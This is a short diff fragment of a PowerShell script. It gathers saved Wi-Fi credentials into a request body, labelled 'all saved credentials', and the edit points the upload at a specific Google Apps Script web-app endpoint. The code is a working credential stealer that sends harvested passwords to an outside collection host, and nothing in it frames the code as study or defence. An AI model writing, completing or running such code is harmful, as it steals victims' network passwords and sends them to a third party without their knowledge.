@@ -15,4 +15,4 @@ $body = @{
         allwifi  = $allWifi # This now contains all saved credentials
 }
 
-Invoke-RestMethod -Uri "https://script.google.com" -Method POST -Body $body
+Invoke-RestMethod -Uri "https://script.google.com/macros/s/AKfycbyeNDhmNh-zMEfXMHr30U2zB6iGZi09bcOfCyslF8KT9mk9EO08p-pHbLv1-OfhNI63/exec" -Method POST -Body $body
